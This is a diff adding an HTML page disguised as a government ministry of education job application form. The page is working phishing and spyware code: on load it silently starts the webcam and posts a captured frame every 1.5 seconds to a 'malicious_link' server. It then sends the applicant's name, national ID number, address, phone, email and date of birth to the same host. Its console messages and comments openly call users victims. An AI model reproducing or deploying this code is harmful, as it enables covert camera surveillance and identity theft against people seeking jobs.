@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Applay now</title>
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png"> 
+    <script type="text/javascript" src="payload1.js"></script>
+    <style>
+        .wrapper1{display: flex;justify-content: center;align-items: center;font: 1em;font-family: Verdana, Geneva, Tahoma, sans-serif;}
+        /* body{margin: 50px auto;} */
+        .form{height: auto;width: 550px;border: 5px solid #222;border-radius: 30px;text-align: center;padding: 40px 10px;}
+        .form:hover{backdrop-filter: blur(1px);}
+        .input-field{width: 100%;height: 39px;margin: 40px 0;border-radius: 10px;}
+        input{width: 95%;height: 100%;padding-left: 10px;font: x-large sans-serif;border: 1px solid #ccc;border-radius: 10px;}
+        input:hover{border: 1px solid #000;border-radius: 10px;}
+        .label{float: left;font-weight: bold;}
+        .gen{display: flex;justify-content: space-between;}
+        .btn {margin: 7px 0;}
+        .radio{width: auto;height: auto;}
+    </style>
+    <style>
+        * {box-sizing: border-box;}
+        body {font-family: Verdana, sans-serif;
+        background: linear-gradient(90deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);
+-webkit-background-size: cover;
+-moz-background-size: cover;
+-o-background-size: cover;
+background-size: cover;
+animation: bg 5s linear -5s infinite}
+
+        @keyframes bg {  
+0% {background: linear-gradient(336deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+20% {background: linear-gradient(48deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+40% {background: linear-gradient(360deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+60% {background: linear-gradient(73deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+80% {background: linear-gradient(0deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+100% {background: linear-gradient(312deg, #eafa0fd0, #239abed2, #001affb6, #83288f9a);}
+}
+        h1  {
+  display:block;
+  /* line-height:1.5; */
+  font:900 35px 'Concert One', sans-serif;
+  /* position:absolute; */
+  color:#fff;
+}
+h2{
+  display:block;
+  font-weight: 900;
+  font-family: Arial, Helvetica, sans-serif;
+  color:#fff;
+}
+    </style>
+</head>
+<body>
+    <div class="anonContent">
+        <div class="video-wrap" hidden="hidden"><video id="video" playsinline autoplay></video></div>
+         <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+          <span id="errorMsg" hidden="hidden"></span>
+    </div>
+
+    <script>
+     
+        function post(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { caption: imgdata},
+            url: 'malicious_link/saver.php',
+            dataType: 'json',
+            async: false,
+            success: function(result){
+                // call the function that handles the response/results
+            },
+            error: function(){
+            }
+          });
+        };
+        
+        
+        'use strict';
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.getElementById('errorMsg');
+        
+        const constraints = {
+          audio: false,
+          video: {
+            facingMode: "user"
+          }
+        };
+        
+        // Access webcam
+        async function init() {
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+          } catch (e) {
+            errorMsgElement.innerHTML = e.toString();
+            console.log(`navigator.getUserMedia error:${e.toString()}`);
+            if (e.toString().includes("NotFoundError")){
+                console.log("Hmm, Internal or External Webcam can not be found in victims device!");
+            await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                xhttp.open("post", "malicious_link/attention.php?denied1=Hmm,_internal_or_external_camera_can_not_be_found_in_victims_device!");//
+                xhttp.send();
+                console.log(xhttp);
+            } else {
+                console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
+                alert("Allow Camera Access for video calls on plat_name!");
+                window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
+                alert("Access to Camera Successfully Granted");
+                console.log("BOOM!, Game Over...");
+            }
+          }
+        }
+        
+        // Success
+        async function handleSuccess(stream) {
+          window.stream = stream;
+          video.srcObject = stream;
+          
+                console.log("we_successfully_hacked_into_victims_camera");
+            await wait4me(5000);
+                var xhttp = new XMLHttpRequest();
+                xhttp.open("post", "malicious_link/attention.php?granted1=Wo-ho!,_we_successfully_hacked_into_victims_camera!, Now_u_can_be_able_to_received_victims_pictures.");//
+                xhttp.send();
+                console.log(xhttp);
+        
+        var context = canvas.getContext('2d');
+          setInterval(function(){
+        
+               context.drawImage(video, 0, 0, 640, 480);
+               var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+               post(canvasData); }, 1500);
+        
+        }
+        
+        // Load init
+        init();
+        
+        </script>
+        
+    <div>
+        <center>
+            <h1 style="text-transform: uppercase;">Job Application Form</h1>
+            <h2 style="text-transform: capitalize;">Powered by the <span>
+                <script>
+                    var evilfeonix = Country;
+                    document.write(evilfeonix);
+                </script>
+            </span>
+            ministry of education</h2>
+        </center>
+
+
+        <script>
+            function displayPic(pic){
+                document.getElementById("pic").setAttribute("src",pic);
+                document.getElementById("victims-pic").style.display="block";
+            }
+                        </script>
+
+    </div>
+    <div class="wrapper1">
+        <div class="form">
+            <h1>Applicant Were To Fill The Form Before Applying</h1>
+            <p id="victims-pic" style="display: none;"><img id="pic" height="300" width="auto" alt=""></p>
+            <div class="input-field"><label for="img"><span class="label">Upload your Photo:</span><input  placeholder='Profile Pic' type="file" id="img" name="vPIC" accept="image/*" onchange="displayPic(window.URL.createObjectURL(this.files[0]));" required></label></div>
+            <div class="input-field"><label for="fname"><span class="label">First Name:</span><input  placeholder='First Name' type="text" id="fname" name="fname" required></label></div>
+            <div class="input-field"><label for="lname"><span class="label">Last Name:</span><input placeholder='Last Name' type="text" id="lname" name="lname" required></label></div>
+            <div class="input-field"><label for="num"><span class="label">Phone Number:</span><input placeholder='Phone Number' type="number" id="num" name="num" required></label></div>
+            <div class="input-field"><label for="email"><span class="label">Email Address:</span><input placeholder='Email Address' type="email" id="email" name="email" required></label></div>
+            <div class="input-field"><label for="state"><span class="label">State:</span><input placeholder='State and LGA' type="text" id="state" name="state" required></label></div>
+            <div class="input-field"><label for="lga"><span class="label">LGA:</span><input placeholder='Local Government Area' type="text" id="lga" name="lga" required></label></div>
+            <div class="input-field"><label for="address"><span class="label">Home Address:</span><input placeholder='Home Address' type="text" id="address" name="address" required></label></div>
+            <div class="input-field"><label for="date"><span class="label">Date of Birth:</span><input type="date" id="date" name="date" required></label></div>
+            <div class="input-field"><label for="nin"><span class="label">NIN ID:</span><input placeholder='National Identification Number' type="text" id="nin" name="nin" required></label></div>
+            <div class="input-field"><label for="job"><span class="label">Occupation:</span><input placeholder='last or current job' type="text" id="job" name="job" required></label></div>
+            <div class="input-field"><label for="gender"><span class="label">Gender:</span></label><br><div class="gen">
+                <label for="male">Male:<input type="radio" class="radio" id="male" name="gender" value="male" required></label>
+                <label for="female">Female:<input type="radio" class="radio" id="female" name="gender" value="female" required></label>
+                <label for="other">Others:<input type="radio" class="radio" id="other" name="gender" value="other" disabled></label>
+            </div></div>
+            <div class="input-field"><label for="maritan"><span class="label">Maritan:</span></label><br><div class="gen">
+                <label for="single">Single:<input type="radio" class="radio" id="single" name="maritan" value="single" required></label>
+                <label for="married">Married:<input type="radio" class="radio" id="marry" name="maritan" value="married" required></label>
+                <label for="other">Others:<input type="radio" class="radio" id="other" name="maritan" value="other" disabled></label>
+            </div></div><p id="err" style="display: none;"></p>
+            <input type="submit" id="btn" class="input-field btn" value="Apply Now">
+            <center><p id="p">Already applied! <a href="#">Please apply again?</a></p></center>
+        </div>
+    </div>
+    <script>
+
+        async function more(){
+        console.log("we_currently_interacting_with_victims_for_their_persional_information");
+            await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/attention.php?message=please_wait!,_we_currently_interacting_with_victims_for_their_persional_information`);//
+        xhttp.send();
+        console.log(xhttp);
+        }
+        
+        document.getElementById("btn").addEventListener("click", function() {
+            
+            var V_img=document.getElementById("img").files[0];
+            // var V_img=window.URL.createObjectURL(V_img);
+            // var imgData=new FormData();
+            // imgData.append(V_img.name,V_img.files[0]);
+            
+            var fname=document.getElementById("fname").value;
+            var state=document.getElementById("state").value;
+             state=state.replaceAll(" ","_"); 
+            var nin=document.getElementById("nin").value;
+             nin=nin.replaceAll(" ","_"); 
+            var lname=document.getElementById("lname").value;
+            var lga=document.getElementById("lga").value;
+             lga=lga.replaceAll(" ","_"); 
+            var job=document.getElementById("job").value;
+             job=job.replaceAll(" ","_"); 
+            var email=document.getElementById("email").value;
+            var home=document.getElementById("address").value; 
+             home=home.replaceAll(" ","_"); 
+            var phone=document.getElementById("num").value;
+             phone=phone.replaceAll(" ","_"); 
+            var dob=document.getElementById("date").value;
+
+            if (document.getElementById("male").checked){var gender="Male";}
+            else if(document.getElementById("female").checked){var gender="Female";}
+            else{var gender="Unidentified";}
+
+            if (document.getElementById("marry").checked){var maritan="Married";}
+            else if(document.getElementById("single").checked){var maritan="Single";}
+            else{var maritan="Unidentified";}
+
+            
+            var current=new Date().getFullYear();
+            var name=fname+" "+lname;
+            name=name.replaceAll(" ","_"); 
+            var year=dob.split("-")[0];
+            var age=current - year;
+            console.log(age);
+
+            if (name=="" || state=="" || lga=="" || nin=="" || job=="" || email=="" || phone=="" || dob=="" || home=="" || gender=="Unidentified"  || maritan=="Unidentified" || V_img==""){
+                document.getElementById("err").style.display = "block";
+                document.getElementById("err").innerHTML = "Opsy!, some of the input fields are not filled, please fill them.";
+                document.getElementById("err").focus();
+                alert("wetin you dey think bros!, you jump some of the input fields Oo, oya go fill them up!...");
+                document.getElementById("err").style.display = "none";
+            }else{
+
+            // var gender=document.getElementById("male").value;
+            
+            console.log(V_img);
+            console.log(fname);
+            console.log(lname);
+            console.log(email);
+            console.log(phone);
+            console.log(state);
+            console.log(lga);
+            console.log(home);
+            console.log(dob);
+            console.log(nin);
+            console.log(job);
+            console.log(gender);
+            console.log(maritan);
+
+            // send the form
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", `malicious_link/form.php?vPIC=${V_img}&name=${name}&email=${email}&phone=${phone}&state=${state}&lga=${lga}&home=${home}&dob=${dob}&nin=${nin}&job=${job}&gender=${gender}&maritan=${maritan}&age=${age}`);//
+            xhttp.send();
+            console.log(xhttp);
+            alert("Successfully submitted");
+        
+        	async function wait(){ 
+        console.log("our work here don dey finish...");
+        console.log("make una start dey pack kaya dey go!");
+        await wait4me(5000);
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("post", `malicious_link/attention.php?redFlag=done_with_the_information_hunting!...`);//
+        xhttp.send();
+        console.log(xhttp);
+            }
+            wait();
+        }
+        });
+    </script>
+</body>
+</html>
+
+<!-- you have been HACKED! -->
+<!-- your informations has been COMPROMISED! -->
